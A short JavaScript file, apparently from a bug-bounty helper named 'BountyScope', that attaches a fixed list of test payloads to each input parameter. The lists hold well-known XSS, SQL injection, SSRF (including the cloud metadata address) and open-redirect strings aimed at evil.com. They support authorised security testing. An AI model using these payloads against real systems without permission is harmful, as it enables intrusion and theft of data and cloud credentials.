/**
 * BountyScope Payload Suggestion Engine
 */

export function generatePayloads(parameters = []) {

  const payloadTemplates = {

    XSS: [
      "<script>alert(1)</script>",
      "\"><svg/onload=alert(1)>",
      "<img src=x onerror=alert(1)>"
    ],

    SQLi: [
      "' OR 1=1 --",
      "admin'--",
      "' UNION SELECT NULL--"
    ],

    SSRF: [
      "http://169.254.169.254/latest/meta-data/",
      "http://localhost:80",
      "http://127.0.0.1"
    ],

    OpenRedirect: [
      "https://evil.com",
      "//evil.com",
      "https:google.com@evil.com"
    ]

  }

  return parameters.map(param => ({

    parameter: param,

    payloads: payloadTemplates

  }))

}
